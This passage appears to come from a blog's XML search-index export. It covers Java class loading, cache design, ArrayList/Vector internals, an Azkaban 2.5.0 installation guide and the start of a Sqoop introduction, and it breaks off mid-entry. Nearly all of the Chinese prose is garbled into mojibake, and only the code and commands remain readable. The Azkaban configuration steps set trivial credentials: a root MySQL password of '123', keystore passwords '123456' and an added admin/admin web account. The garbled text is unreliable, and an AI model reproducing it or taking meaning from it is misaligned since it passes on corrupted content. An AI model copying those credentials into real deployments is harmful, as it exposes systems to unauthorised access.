    <content type="text"><![CDATA[ç±»åŠ è½½æœºåˆ¶åŒäº²å§”æ´¾æ¨¡å‹æ¨¡å‹å¦‚ä¸‹å›¾ï¼š åŒäº²å§”æ´¾æ¨¡å‹ä¸­é™¤äº†å¯åŠ¨ç±»åŠ è½½å™¨ä¹‹å¤–å…¶ä½™éƒ½éœ€è¦æœ‰è‡ªå·±çš„çˆ¶ç±»åŠ è½½å™¨ å½“ä¸€ä¸ªç±»æ”¶åˆ°äº†ç±»åŠ è½½è¯·æ±‚æ—¶: è‡ªå·±ä¸ä¼šé¦–å…ˆåŠ è½½ï¼Œè€Œæ˜¯å§”æ´¾ç»™çˆ¶åŠ è½½å™¨è¿›è¡ŒåŠ è½½ï¼Œæ¯ä¸ªå±‚æ¬¡çš„åŠ è½½å™¨éƒ½æ˜¯è¿™æ ·ã€‚ æ‰€ä»¥æœ€ç»ˆæ¯ä¸ªåŠ è½½è¯·æ±‚éƒ½ä¼šç»è¿‡å¯åŠ¨ç±»åŠ è½½å™¨ã€‚åªæœ‰å½“çˆ¶ç±»åŠ è½½è¿”å›ä¸èƒ½åŠ è½½æ—¶å­åŠ è½½å™¨æ‰ä¼šè¿›è¡ŒåŠ è½½ã€‚ åŒäº²å§”æ´¾çš„å¥½å¤„ : ç”±äºæ¯ä¸ªç±»åŠ è½½éƒ½ä¼šç»è¿‡æœ€é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œæ¯”å¦‚ java.lang.Objectè¿™æ ·çš„ç±»åœ¨å„ä¸ªç±»åŠ è½½å™¨ä¸‹éƒ½æ˜¯åŒä¸€ä¸ªç±»(åªæœ‰å½“ä¸¤ä¸ªç±»æ˜¯ç”±åŒä¸€ä¸ªç±»åŠ è½½å™¨åŠ è½½çš„æ‰æœ‰æ„ä¹‰ï¼Œè¿™ä¸¤ä¸ªç±»æ‰ç›¸ç­‰ã€‚) å¦‚æœæ²¡æœ‰åŒäº²å§”æ´¾æ¨¡å‹ï¼Œç”±å„ä¸ªç±»åŠ è½½å™¨è‡ªè¡ŒåŠ è½½çš„è¯ã€‚å½“ç”¨æˆ·è‡ªå·±ç¼–å†™äº†ä¸€ä¸ª java.lang.Objectç±»ï¼Œé‚£æ ·ç³»ç»Ÿä¸­å°±ä¼šå‡ºç°å¤šä¸ª Objectï¼Œè¿™æ · Java ç¨‹åºä¸­æœ€åŸºæœ¬çš„è¡Œä¸ºéƒ½æ— æ³•ä¿è¯ï¼Œç¨‹åºä¼šå˜çš„éå¸¸æ··ä¹±ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cache-design]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FCache-design%2F</url>
    <content type="text"><![CDATA[åˆ†å¸ƒå¼ç¼“å­˜è®¾è®¡ç›®å‰å¸¸è§çš„ç¼“å­˜æ–¹æ¡ˆéƒ½æ˜¯åˆ†å±‚ç¼“å­˜ï¼Œé€šå¸¸å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ å±‚ï¼š NG æœ¬åœ°ç¼“å­˜ï¼Œå‘½ä¸­çš„è¯ç›´æ¥è¿”å›ã€‚ NG æ²¡æœ‰å‘½ä¸­æ—¶åˆ™éœ€è¦æŸ¥è¯¢åˆ†å¸ƒå¼ç¼“å­˜ï¼Œå¦‚ Redis ã€‚ å¦‚æœåˆ†å¸ƒå¼ç¼“å­˜æ²¡æœ‰å‘½ä¸­åˆ™éœ€è¦å›æºåˆ° Tomcat åœ¨æœ¬åœ°å †è¿›è¡ŒæŸ¥è¯¢ï¼Œå‘½ä¸­ä¹‹åå¼‚æ­¥å†™å› Redis ã€‚ ä»¥ä¸Šéƒ½æ²¡æœ‰å‘½ä¸­é‚£å°±åªæœ‰ä» DB æˆ–è€…æ˜¯æ•°æ®æºè¿›è¡ŒæŸ¥è¯¢ï¼Œå¹¶å†™å›åˆ° Redis ä¸­ã€‚ ç¼“å­˜æ›´æ–°çš„åŸå­æ€§åœ¨å†™å› Redis çš„æ—¶å€™å¦‚æœæ˜¯ Tomcat é›†ç¾¤ï¼Œå¤šä¸ªè¿›ç¨‹åŒæ—¶å†™é‚£å¾ˆæœ‰å¯èƒ½å‡ºç°è„æ•°æ®ï¼Œè¿™æ—¶å°±ä¼šå‡ºç°æ›´æ–°åŸå­æ€§çš„é—®é¢˜ã€‚ å¯ä»¥æœ‰ä»¥ä¸‹è§£å†³æ–¹æ¡ˆ: å¯ä»¥å°†å¤šä¸ª Tomcat ä¸­çš„æ•°æ®å†™å…¥åˆ° MQ é˜Ÿåˆ—ä¸­ï¼Œç”±æ¶ˆè´¹è€…è¿›è¡Œå•çº¿ç¨‹æ›´æ–°ç¼“å­˜ã€‚ åˆ©ç”¨åˆ†å¸ƒå¼é”ï¼Œåªæœ‰è·å–åˆ°é”è¿›ç¨‹æ‰èƒ½å†™æ•°æ®ã€‚ å¦‚ä½•å†™ç¼“å­˜å†™ç¼“å­˜æ—¶ä¹Ÿè¦æ³¨æ„ï¼Œé€šå¸¸æ¥è¯´åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š å¼€å¯äº‹ç‰©ã€‚ å†™å…¥ DB ã€‚ æäº¤äº‹ç‰©ã€‚ å†™å…¥ç¼“å­˜ã€‚ è¿™é‡Œå¯èƒ½ä¼šå­˜åœ¨æ•°æ®åº“å†™å…¥æˆåŠŸä½†æ˜¯ç¼“å­˜å†™å…¥å¤±è´¥çš„æƒ…å†µï¼Œä½†æ˜¯ä¹Ÿä¸å»ºè®®å°†å†™å…¥ç¼“å­˜åŠ å…¥åˆ°äº‹åŠ¡ä¸­ã€‚å› ä¸ºå†™ç¼“å­˜çš„æ—¶å€™å¯èƒ½ä¼šå› ä¸ºç½‘ç»œåŸå› è€—æ—¶è¾ƒé•¿ï¼Œè¿™æ ·ä¼šé˜»å¡æ•°æ®åº“äº‹åŠ¡ã€‚å¦‚æœå¯¹ä¸€è‡´æ€§è¦æ±‚ä¸é«˜å¹¶ä¸”æ•°æ®é‡ä¹Ÿä¸å¤§çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å•ç‹¬èµ·ä¸€ä¸ªæœåŠ¡æ¥åš DB å’Œç¼“å­˜ä¹‹é—´çš„æ•°æ®åŒæ­¥æ“ä½œã€‚ æ›´æ–°ç¼“å­˜æ—¶ä¹Ÿå»ºè®®åšå¢é‡æ›´æ–°ã€‚ è´Ÿè½½ç­–ç•¥ç¼“å­˜è´Ÿè½½ç­–ç•¥ä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸¤ç§ï¼š è½®è¯¢æœºåˆ¶ã€‚ ä¸€è‡´å“ˆå¸Œç®—æ³•ã€‚ è½®è¯¢çš„ä¼˜ç‚¹æ˜¯è´Ÿè½½åˆ°å„ä¸ªæœåŠ¡å™¨çš„è¯·æ±‚æ˜¯å‡åŒ€çš„ï¼Œä½†æ˜¯å¦‚æœè¿›è¡Œæ‰©å®¹åˆ™ç¼“å­˜å‘½ä¸­ç‡ä¼šä¸‹é™ã€‚ ä¸€è‡´å“ˆå¸Œçš„ä¼˜ç‚¹æ˜¯ç›¸åŒçš„è¯·æ±‚ä¼šè´Ÿè½½åˆ°åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œå‘½ä¸­ç‡ä¸ä¼šéšç€æ‰©å®¹è€Œé™ä½ï¼Œä½†æ˜¯å½“å¤§æµé‡è¿‡æ¥æ—¶æœ‰å¯èƒ½æŠŠæœåŠ¡å™¨æ‹–å®ã€‚ æ‰€ä»¥å»ºè®®ä¸¤ç§æ–¹æ¡ˆéƒ½é‡‡ç”¨ï¼šé¦–å…ˆé‡‡ç”¨ä¸€è‡´å“ˆå¸Œç®—æ³•ï¼Œå½“æµé‡è¾¾åˆ°ä¸€å®šçš„é˜ˆå€¼çš„æ—¶å€™åˆ™åˆ‡æ¢ä¸ºè½®è¯¢ï¼Œè¿™æ ·æ—¢èƒ½ä¿è¯ç¼“å­˜å‘½ä¸­ç‡ï¼Œä¹Ÿèƒ½æé«˜ç³»ç»Ÿçš„å¯ç”¨æ€§ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArrayList]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FArrayList%2F</url>
    <content type="text"><![CDATA[ArrayList/Vector çš„åº•å±‚åˆ†æArrayListArrayList å®ç°äº Listã€RandomAccess æ¥å£ã€‚å¯ä»¥æ’å…¥ç©ºæ•°æ®ï¼Œä¹Ÿæ”¯æŒéšæœºè®¿é—®ã€‚ ArrayListç›¸å½“äºåŠ¨æ€æ•°æ®ï¼Œå…¶ä¸­æœ€é‡è¦çš„ä¸¤ä¸ªå±æ€§åˆ†åˆ«æ˜¯:elementData æ•°ç»„ï¼Œä»¥åŠ size å¤§å°ã€‚åœ¨è°ƒç”¨ add() æ–¹æ³•çš„æ—¶å€™ï¼š12345public boolean add(E e) &#123; ensureCapacityInternal(size + 1); // Increments modCount!! elementData[size++] = e; return true;&#125; é¦–å…ˆè¿›è¡Œæ‰©å®¹æ ¡éªŒã€‚ å°†æ’å…¥çš„å€¼æ”¾åˆ°å°¾éƒ¨ï¼Œå¹¶å°† size + 1 ã€‚ å¦‚æœæ˜¯è°ƒç”¨ add(index,e) åœ¨æŒ‡å®šä½ç½®æ·»åŠ çš„è¯ï¼š12345678910public void add(int index, E element) &#123; rangeCheckForAdd(index); ensureCapacityInternal(size + 1); // Increments modCount!! //å¤åˆ¶ï¼Œå‘åç§»åŠ¨ System.arraycopy(elementData, index, elementData, index + 1, size - index); elementData[index] = element; size++;&#125; ä¹Ÿæ˜¯é¦–å…ˆæ‰©å®¹æ ¡éªŒã€‚ æ¥ç€å¯¹æ•°æ®è¿›è¡Œå¤åˆ¶ï¼Œç›®çš„æ˜¯æŠŠ index ä½ç½®ç©ºå‡ºæ¥æ”¾æœ¬æ¬¡æ’å…¥çš„æ•°æ®ï¼Œå¹¶å°†åé¢çš„æ•°æ®å‘åç§»åŠ¨ä¸€ä¸ªä½ç½®ã€‚ å…¶å®æ‰©å®¹æœ€ç»ˆè°ƒç”¨çš„ä»£ç :1234567891011private void grow(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win: elementData = Arrays.copyOf(elementData, newCapacity);&#125; ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„å¤åˆ¶çš„è¿‡ç¨‹ã€‚ ç”±æ­¤å¯è§ ArrayList çš„ä¸»è¦æ¶ˆè€—æ˜¯æ•°ç»„æ‰©å®¹ä»¥åŠåœ¨æŒ‡å®šä½ç½®æ·»åŠ æ•°æ®ï¼Œåœ¨æ—¥å¸¸ä½¿ç”¨æ—¶æœ€å¥½æ˜¯æŒ‡å®šå¤§å°ï¼Œå°½é‡å‡å°‘æ‰©å®¹ã€‚æ›´è¦å‡å°‘åœ¨æŒ‡å®šä½ç½®æ’å…¥æ•°æ®çš„æ“ä½œã€‚ åºåˆ—åŒ–ç”±äº ArrayList æ˜¯åŸºäºåŠ¨æ€æ•°ç»„å®ç°çš„ï¼Œæ‰€ä»¥å¹¶ä¸æ˜¯æ‰€æœ‰çš„ç©ºé—´éƒ½è¢«ä½¿ç”¨ã€‚å› æ­¤ä½¿ç”¨äº† transient ä¿®é¥°ï¼Œå¯ä»¥é˜²æ­¢è¢«è‡ªåŠ¨åºåˆ—åŒ–ã€‚ 1transient Object[] elementData; å› æ­¤ ArrayList è‡ªå®šä¹‰äº†åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException&#123; // Write out element count, and any hidden stuff int expectedModCount = modCount; s.defaultWriteObject(); // Write out size as capacity for behavioural compatibility with clone() s.writeInt(size); // Write out all elements in the proper order. //åªåºåˆ—åŒ–äº†è¢«ä½¿ç”¨çš„æ•°æ® for (int i=0; i&lt;size; i++) &#123; s.writeObject(elementData[i]); &#125; if (modCount != expectedModCount) &#123; throw new ConcurrentModificationException(); &#125;&#125;private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; elementData = EMPTY_ELEMENTDATA; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in capacity s.readInt(); // ignored if (size &gt; 0) &#123; // be like clone(), allocate array based upon size not capacity ensureCapacityInternal(size); Object[] a = elementData; // Read in all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; a[i] = s.readObject(); &#125; &#125;&#125; å½“å¯¹è±¡ä¸­è‡ªå®šä¹‰äº† writeObject å’Œ readObject æ–¹æ³•æ—¶ï¼ŒJVM ä¼šè°ƒç”¨è¿™ä¸¤ä¸ªè‡ªå®šä¹‰æ–¹æ³•æ¥å®ç°åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€‚ ä»å®ç°ä¸­å¯ä»¥çœ‹å‡º ArrayList åªåºåˆ—åŒ–äº†è¢«ä½¿ç”¨çš„æ•°æ®ã€‚ VectorVoctor ä¹Ÿæ˜¯å®ç°äº List æ¥å£ï¼Œåº•å±‚æ•°æ®ç»“æ„å’Œ ArrayList ç±»ä¼¼,ä¹Ÿæ˜¯ä¸€ä¸ªåŠ¨æ€æ•°ç»„å­˜æ”¾æ•°æ®ã€‚ä¸è¿‡æ˜¯åœ¨ add() æ–¹æ³•çš„æ—¶å€™ä½¿ç”¨ synchronize è¿›è¡ŒåŒæ­¥å†™æ•°æ®ï¼Œä½†æ˜¯å¼€é”€è¾ƒå¤§ï¼Œæ‰€ä»¥ Vector æ˜¯ä¸€ä¸ªåŒæ­¥å®¹å™¨å¹¶ä¸æ˜¯ä¸€ä¸ªå¹¶å‘å®¹å™¨ã€‚ ä»¥ä¸‹æ˜¯ add() æ–¹æ³•ï¼š123456public synchronized boolean add(E e) &#123; modCount++; ensureCapacityHelper(elementCount + 1); elementData[elementCount++] = e; return true;&#125; ä»¥åŠæŒ‡å®šä½ç½®æ’å…¥æ•°æ®:1234567891011121314public void add(int index, E element) &#123; insertElementAt(element, index);&#125;public synchronized void insertElementAt(E obj, int index) &#123; modCount++; if (index &gt; elementCount) &#123; throw new ArrayIndexOutOfBoundsException(index + " &gt; " + elementCount); &#125; ensureCapacityHelper(elementCount + 1); System.arraycopy(elementData, index, elementData, index + 1, elementCount - index); elementData[index] = obj; elementCount++;&#125;]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Azkaban]]></title>
    <url>%2F2018%2F06%2F29%2FHadoop%2F6-Sqoop%26Azkaban%2FAzkaban%2F</url>
    <content type="text"><![CDATA[1.å‡ºç°å¥‘æœºåº”ç”¨åœºæ™¯ä¸¾ä¾‹: 1ã€é€šè¿‡ Hadoop å…ˆå°†åŸå§‹æ•°æ®åŒæ­¥åˆ° HDFS ä¸Š; 2ã€å€ŸåŠ© MapReduce è®¡ç®—æ¡†æ¶å¯¹åŸå§‹æ•°æ®è¿›è¡Œæ¸…æ´—è½¬æ¢ï¼Œç”Ÿæˆçš„æ•°æ®ä»¥åˆ†åŒºè¡¨çš„å½¢å¼å­˜å‚¨åˆ° å¤šå¼  Hive è¡¨ä¸­; 3ã€éœ€è¦å¯¹ Hive ä¸­å¤šä¸ªè¡¨çš„æ•°æ®è¿›è¡Œ Join å¤„ç†ï¼Œå¾—åˆ°ä¸€ä¸ªæ˜ç»†æ•°æ® Hive å¤§è¡¨; 4ã€å°†æ˜ç»†æ•°æ®è¿›è¡Œå„ç§ç»Ÿè®¡åˆ†æï¼Œå¾—åˆ°ç»“æœæŠ¥è¡¨ä¿¡æ¯; 5ã€éœ€è¦å°†ç»Ÿè®¡åˆ†æå¾—åˆ°çš„ç»“æœæ•°æ®åŒæ­¥åˆ°ä¸šåŠ¡ç³»ç»Ÿä¸­ï¼Œä¾›ä¸šåŠ¡è°ƒç”¨ä½¿ç”¨ã€‚ 2.å¸¸è§å·¥ä½œæµè°ƒåº¦ç³»ç»Ÿ &amp; å¯¹æ¯”åœ¨ Hadoop é¢†åŸŸï¼Œå¸¸è§çš„å·¥ä½œæµè°ƒåº¦å™¨æœ‰ Oozieï¼ŒAzkabanï¼ŒCascadingï¼ŒHamake ç­‰ 2.1.å„ç§è°ƒåº¦å·¥å…·å¯¹æ¯” 2.2.Azkaban ä¸ Oozie å¯¹æ¯”ooize ç›¸æ¯” azkaban æ˜¯ä¸€ä¸ªé‡é‡çº§çš„ä»»åŠ¡è°ƒåº¦ç³»ç»Ÿï¼ŒåŠŸèƒ½å…¨é¢ï¼Œä½†é…ç½®ä½¿ç”¨ä¹Ÿæ›´å¤æ‚ã€‚å¦‚æœå¯ä»¥ä¸ åœ¨æ„æŸäº›åŠŸèƒ½çš„ç¼ºå¤±ï¼Œè½»é‡çº§è°ƒåº¦å™¨ azkaban æ˜¯å¾ˆä¸é”™çš„å€™é€‰å¯¹è±¡ã€‚ ïµ å·¥ä½œæµå®šä¹‰ Azkaban ä½¿ç”¨ Properties æ–‡ä»¶å®šä¹‰å·¥ä½œæµ Oozie ä½¿ç”¨ XML æ–‡ä»¶å®šä¹‰å·¥ä½œæµ ïµ å®šæ—¶æ‰§è¡Œ Azkaban çš„å®šæ—¶æ‰§è¡Œä»»åŠ¡æ˜¯åŸºäºæ—¶é—´çš„ Oozie çš„å®šæ—¶æ‰§è¡Œä»»åŠ¡åŸºäºæ—¶é—´å’Œè¾“å…¥æ•°æ® 2.3.Azkaban ç»„ä»¶å…³ç³»å…³ç³»æ•°æ®åº“(ç›®å‰ä»…æ”¯æŒ MySQL) web ç®¡ç†æœåŠ¡å™¨-AzkabanWebServer æ‰§è¡ŒæœåŠ¡å™¨-AzkabanExecutorServer Azkaban ä½¿ç”¨ MySQL æ¥å­˜å‚¨å®ƒçš„çŠ¶æ€ä¿¡æ¯ï¼ŒAzkaban Executor Server å’Œ Azkaban Web Server å‡ä½¿ç”¨åˆ°äº† MySQL æ•°æ®åº“ã€‚ å®ƒæœ‰å¦‚ä¸‹åŠŸèƒ½ç‰¹ç‚¹: ï‚² Web ç”¨æˆ·ç•Œé¢ ï‚² æ–¹ä¾¿ä¸Šä¼ å·¥ä½œæµ ï‚² æ–¹ä¾¿è®¾ç½®ä»»åŠ¡ä¹‹é—´çš„å…³ç³» ï‚² è°ƒåº¦å·¥ä½œæµ ï‚² è®¤è¯/æˆæƒ(æƒé™çš„å·¥ä½œ) ï‚² èƒ½å¤Ÿæ€æ­»å¹¶é‡æ–°å¯åŠ¨å·¥ä½œæµ ï‚² æ¨¡å—åŒ–å’Œå¯æ’æ‹”çš„æ’ä»¶æœºåˆ¶ ï‚² é¡¹ç›®å·¥ä½œåŒº ï‚² å·¥ä½œæµå’Œä»»åŠ¡çš„æ—¥å¿—è®°å½•å’Œå®¡è®¡ 3.Azkaban å®‰è£…éƒ¨ç½²3.1å‡†å¤‡å·¥ä½œAzkaban Web æœåŠ¡å™¨:azkaban-web-server-2.5.0.tar.gz Azkaban Excutor æ‰§è¡ŒæœåŠ¡å™¨ :azkaban-executor-server-2.5.0.tar.gz Azkaban åˆå§‹åŒ–è„šæœ¬æ–‡ä»¶:azkaban-sql-script-2.5.0.tar.gz 3.2å®‰è£…è¯´æ˜å°†å®‰è£…æ–‡ä»¶ä¸Šä¼ åˆ°é›†ç¾¤,æœ€å¥½ä¸Šä¼ åˆ°å®‰è£…hiveã€sqoop çš„æœºå™¨ä¸Š,æ–¹ä¾¿å‘½ä»¤çš„æ‰§è¡Œã€‚å¹¶æœ€å¥½åŒ ä¸€å­˜æ”¾åœ¨ apps ç›®å½•ä¸‹,ç”¨äºå­˜æ”¾æºå®‰è£…æ–‡ä»¶.æ–°å»º azkaban ç›®å½•,ç”¨äºå­˜æ”¾ azkaban è¿è¡Œç¨‹åº 3.3è§£å‹123tar -zxvf azkaban-web-server-2.5.0.tar.gz -C /home/apps/ap/azkaban/tar -zxvf azkaban-executor-server-2.5.0.tar.gz -C /home/apps/ap/azkaban/tar -zxvf azkaban-sql-script-2.5.0.tar.gz -C /home/apps/ap/azkaban/ 3.4è¿›å…¥ mysql å¯¼å…¥ä»»åŠ¡ job è¡¨12345mysql&gt; create database azkaban; Query OK, 1 row affected (0.01 sec)mysql&gt; use azkaban; Database changedmysql&gt; source /home/hadoop/apps/azkaban/azkaban-script-2.5.0/create-all-sql-2.5.0.sql; 3.5åˆ›å»º SSL é…ç½®æœ€å¥½æ˜¯åœ¨ azkaban ç›®å½•ä¸‹æ‰§è¡Œ: 123456789101112131415161718192021222324252627282930# æ‰§è¡Œå‘½ä»¤: keytool -keystore keystore -alias jetty -genkey -keyalg RSA# è¿è¡Œæ­¤å‘½ä»¤å,ä¼šæç¤ºè¾“å…¥å½“å‰ç”Ÿæˆ keystore çš„å¯†ç åŠç›¸åº”ä¿¡æ¯,è¾“å…¥å¯†ç è¯·åŠ³è®°,ä¿¡æ¯å¦‚ä¸‹:Enter keystore password:Re-enter new password:What is your first and last name? [Unknown]:What is the name of your organizational unit? [Unknown]:What is the name of your organization? [Unknown]:What is the name of your City or Locality? [Unknown]:What is the name of your State or Province? [Unknown]:What is the two-letter country code for this unit? [Unknown]: CNIs CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=CN correct? [no]: yEnter key password for &lt;jetty&gt;(RETURN if same as keystore password):æ­¤æ—¶, ä¼šå‘ç°ç›®å½•ä¸‹æœ‰ä¸€ä¸ª Keystore æ–‡ä»¶------------------------------------------å®Œæˆä¸Šè¿°å·¥ä½œå,å°†åœ¨å½“å‰ç›®å½•ç”Ÿæˆ keystore è¯ä¹¦æ–‡ä»¶,å°† keystore æ‹·è´åˆ° azkaban web æœåŠ¡ å™¨æ ¹ç›®å½•ä¸­.å¦‚:ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿cp keystore azkaban-web-2.5.0 3.6 ä¿®æ”¹é…ç½®æ–‡ä»¶æ³¨æ„: é…ç½®æ–‡ä»¶åé¢ä¸€å®šä¸è¦æœ‰ç©ºæ ¼ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182831) ç”Ÿæˆæ—¶åŒºé…ç½®æ–‡ä»¶ Asia/Shanghaiï¼Œç”¨äº¤äº’å¼å‘½ä»¤ tzselect å³å¯, å¦‚æœæœ‰çš„è¯å°±ä¸ç”¨å†ç”Ÿæˆäº† tzselect 2) æ‹·è´è¯¥æ—¶åŒºæ–‡ä»¶ï¼Œè¦†ç›–ç³»ç»Ÿæœ¬åœ°æ—¶åŒºé…ç½® sudo cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime3) ï£¿ï£¿ï£¿ azkaban web æœåŠ¡å™¨é…ç½® ï£¿ï£¿ï£¿3.1) ï£¿ é…ç½® web çš„ azkaban.properties ï£¿ cd ~/apps/azkaban/azkaban-web-2.5.0/conf/ vi azkaban.propertiesï£¿ ä»¥ä¸‹æ˜¯éœ€è¦ä¿®æ”¹çš„å†…å®¹ ï£¿#é»˜è®¤æ ¹ web ç›®å½•web.resource.dir=/home/ap/apps/azkaban/azkaban-web-2.5.0/web#é»˜è®¤æ—¶åŒº,å·²æ”¹ä¸ºäºšæ´²/ä¸Šæµ· é»˜è®¤ä¸ºç¾å›½default.timezone.id=Asia/Shanghai#ç”¨æˆ·é…ç½®,å…·ä½“é…ç½®å‚åŠ ä¸‹æ–‡user.manager.xml.file=/home/ap/apps/azkaban/azkaban-web-2.5.0/conf/azkaban-users.xml#globalé…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®executor.global.properties=/home/ap/apps/azkaban/azkaban-executor-2.5.0/conf/global.properties#æ•°æ®åº“ç›¸å…³é…ç½®mysql.host=cs2mysql.database=azkabanmysql.user=rootmysql.password=123#SSL æ–‡ä»¶åjetty.keystore=/home/ap/apps/azkaban/azkaban-web-2.5.0/keystore#SSL æ–‡ä»¶å¯†ç jetty.password=123456#Jetty ä¸»å¯†ç  ä¸ keystore æ–‡ä»¶ç›¸åŒjetty.keypassword=123456#SSL æ–‡ä»¶åjetty.truststore=/home/ap/apps/azkaban/azkaban-web-2.5.0/keystore# SSL æ–‡ä»¶å¯†ç jetty.trustpassword=1234563.2) é…ç½® web çš„ azkaban-users.xml # å¢åŠ  ç®¡ç†å‘˜ç”¨æˆ·vi azkaban-users.xml &lt;azkaban-users&gt; &lt;user username="azkaban" password="azkaban" roles="admin" groups="azkaban"/&gt; &lt;user username="metrics" password="metrics" roles="metrics"/&gt; # æ­¤è¡Œæ˜¯åŠ çš„, æŒ‡ç”¨æˆ·åå¯†ç éƒ½ä¸º admin &lt;user username="admin" password="admin" roles="admin,metrics"/&gt; &lt;role name="admin" permissions="ADMIN"/&gt; &lt;role name="metrics" permissions="METRICS"/&gt; &lt;/azkaban-users&gt; 4) ï£¿ï£¿ï£¿ é…ç½®æ‰§è¡ŒæœåŠ¡å™¨ executor ï£¿ï£¿ï£¿ cd apps/azkaban/azkaban-executor-2.5.0/conf/ vi azkaban.properties-----ä»¥ä¸‹æ˜¯éœ€è¦ä¿®æ”¹çš„å†…å®¹------#æ—¶åŒºdefault.timezone.id=Asia/Shanghai # Azkaban JobTypes æ’ä»¶é…ç½®ï¼Œæ’ä»¶æ‰€åœ¨ä½ç½® azkaban.jobtype.plugin.dir=/home/hadoop/apps/azkaban/azkaban-executor-2.5.0/plugins/jobtypes#Loader for projectsexecutor.global.properties=/home/ap/apps/azkaban/azkaban-executor-2.5.0/conf/global.properties#mysql éœ€è¦ä¿®æ”¹çš„åœ°æ–¹mysql.host=cs2mysql.database=azkabanmysql.user=rootmysql.password=1235)ï£¿ï£¿ï£¿ é…ç½®ç¯å¢ƒå˜é‡ ï£¿ï£¿ï£¿vi .zshrc # azkabanexport AZKABAN_WEB_HOME=/home/ap/apps/azkaban/azkaban-web-2.5.0export AZKABAN_EXE_HOME=/home/ap/apps/azkaban/azkaban-executor-2.5.0export PATH=$PATH:$AZKABAN_WEB_HOME/bin:$AZKABAN_EXE_HOME/bin 3.7 å¯åŠ¨12345678910111213141516171819201) ï£¿ï£¿ï£¿ å¯åŠ¨ Azkaban Web Server: ï£¿ï£¿ï£¿# ps: .out æ˜¯æ—¥å¿—, å¯ä»¥å…ˆåˆ›å»º logs ç›®å½•, æ—¥å¿—åœ°å€éšä¾¿# å‰å°å¯åŠ¨azkaban-web-start.sh# åå°å¯åŠ¨nohup azkaban-web-start.sh 1&gt;/home/ap/logs/azwebstd.out 2&gt;/home/ap/logs/azweberr.out &amp;2) ï£¿ï£¿ï£¿ å¯åŠ¨ Azkaban Executor: ï£¿ï£¿ï£¿#å‰å°å¯åŠ¨azkaban-executor-start.sh# åå°å¯åŠ¨nohup azkaban-executor-start.sh 1&gt;/home/ap/logs/azexstd.out 2&gt;/home/ap/logs/azexerr.out &amp;3) ï£¿ï£¿ï£¿ ç™»å½• webUI ï£¿ï£¿ï£¿https://cs2:8443/u: adminp: admin# æ³¨æ„: é…ç½®åé¢ä¸èƒ½æœ‰ç©ºæ ¼!!! 4.Azkaban å®æˆ˜æ¼”ç¤ºè§è¿™é‡Œ]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Azkaban</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>Azkaban</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqoop]]></title>
    <url>%2F2018%2F06%2F28%2FHadoop%2F6-Sqoop%26Azkaban%2FSqoop%2F</url>
    <content type="text"><![CDATA[1. ä½œç”¨ Sqoop æ˜¯ Apache æ——ä¸‹ä¸€æ¬¾â€œHadoop å’Œå…³ç³»æ•°æ®åº“æœåŠ¡å™¨ä¹‹é—´ä¼ é€æ•°æ®â€çš„å·¥å…·ã€‚ å¯¼å…¥æ•°æ®ï¼šMySQLï¼ŒOracle å¯¼å…¥æ•°æ®åˆ° Hadoop çš„ HDFSã€HIVEã€HBASE ç­‰æ•°æ®å­˜å‚¨ç³»ç»Ÿ å¯¼å‡ºæ•°æ®ï¼šä» Hadoop çš„æ–‡ä»¶ç³»ç»Ÿä¸­å¯¼å‡ºæ•°æ®åˆ°å…³ç³»æ•°æ®åº“ MySQL ç­‰ Sqoop çš„æœ¬è´¨è¿˜æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå’Œ HDFSï¼ŒHive ç›¸æ¯”ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆé«˜æ·±çš„ç†è®ºã€‚ 2.å·¥ä½œæœºåˆ¶å°†å¯¼å…¥å¯¼å‡ºå‘½ä»¤ç¿»è¯‘æˆ MapReduce ç¨‹åºæ¥å®ç° åœ¨ç¿»è¯‘å‡ºçš„ MapReduce ä¸­ä¸»è¦æ˜¯å¯¹ InputFormat å’Œ OutputFormat è¿›è¡Œå®šåˆ¶ 3.å®‰è£…æ³¨æ„: 